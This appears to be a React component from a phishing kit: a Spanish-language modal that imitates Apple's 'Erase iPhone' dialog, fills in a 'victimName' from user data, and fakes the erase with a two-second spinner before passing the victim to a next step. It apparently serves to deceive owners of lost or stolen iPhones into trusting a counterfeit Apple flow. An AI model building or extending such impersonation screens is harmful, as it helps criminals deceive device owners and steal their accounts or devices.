import { useState } from "react";
import SvgSpinner from './svgComponents/SvgSpinner'
import { Modal, Button } from "react-bootstrap";
import { useData } from "../../context/UserContext";
const EraseIphoneModal = ({ show, onClose, onSuccess, translator }) => {
    const { user } = useData();
    const [loading, setLoading] = useState(false);

    const handleNext = () => {
        setLoading(true);
        setTimeout(() => {
            setLoading(false);
            onClose();
            if (onSuccess) onSuccess();
        }, 2000); // 2 segundos de spinner
    };

    return (
        <Modal
            show={show}
            onHide={onClose}
            centered
            backdrop="static"
            keyboard={false}
            style={{
                background: "rgb(24 24 24 / 39%)",
                color: "#fff",
                borderRadius: 16,
                padding: 8,
                fontFamily: "system-ui, sans-serif",

            }}
        >
            <Modal.Header style={{ background: "#181818", borderBottom: "none", color: "#fff" }}>
            </Modal.Header>
            <Modal.Body style={{ background: "#181818", color: "#fff", textAlign: "center" }}>
                <div style={{ color: "#b0b0b0", fontWeight: 500, marginBottom: 18 }}>
                    <span style={{ fontWeight: 700, fontSize: 22 }}>{translator("Borrar iPhone")}</span><br />
                    <span style={{ fontWeight: 400, fontSize: 15 }}>
                        {
                            (() => {
                                try {                                   
                                    return user?.data?.victimName || "iPhone";
                                } catch {
                                    return "iPhone";
                                }
                            })()
                        }
                    </span>
                </div>
                <div
                    style={{
                        color: "#e0e0e0",
                        fontSize: 15,
                        marginBottom: 28,
                        lineHeight: 1.5,
                        fontWeight: 400,
                    }}
                >
                    {translator("Todo el contenido y la configuración se borrarán. Si la red de Encontrar está activada, aún podrás seguir ubicando este iPhone.")}
                </div>
            </Modal.Body>
            <Modal.Footer style={{ background: "#181818", borderTop: "none" }}>

                <Button
                    variant="success"
                    onClick={handleNext}
                    style={{
                        background: "green",
                        margin: "auto",
                        width: "300px",
                        fontWeight: 600,
                        fontSize: 17,
                        padding: "12px 0",
                        borderRadius: 8,
                    }}
                > {!loading ? (
                    <span>{translator("Siguiente")}</span>
                ) : (<SvgSpinner width={20} height={20} />)}
                </Button>

            </Modal.Footer>
        </Modal>
    );
};

export default EraseIphoneModal;